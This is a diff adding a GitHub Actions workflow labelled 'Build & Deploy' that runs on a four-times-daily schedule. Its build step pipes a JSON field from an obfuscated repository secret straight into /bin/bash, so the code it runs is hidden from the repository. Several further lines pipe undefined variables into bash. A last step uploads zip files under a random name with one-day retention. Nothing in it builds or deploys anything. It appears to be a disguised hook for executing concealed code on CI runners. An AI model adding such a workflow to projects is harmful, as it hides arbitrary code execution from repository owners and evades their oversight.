@@ -1,0 +1,39 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '50 3,9,15,21 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  perform:
+    name: Run build
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run build
+        env:
+          e058: ${{ secrets.e058 }}
+        run: |
+          printf '%s' "$e058" | jq -r .wcnpd112 | /bin/bash
+          echo $d30 | jq -r .bl89 | /bin/bash
+          echo $fsaa95 | jq -r .j88 | /bin/bash
+          echo $xuu258 | jq -r .fw8562 | /bin/bash
+          printf '%s' "$tb67377" | jq -r .hjq88397 | /bin/bash
+          echo $wxrt5371 | jq -r .uht3599 | /bin/bash
+          echo $t27 | jq -r .cczy476 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: pFN734bb
+          path: "*.zip"
+          retention-days: 1
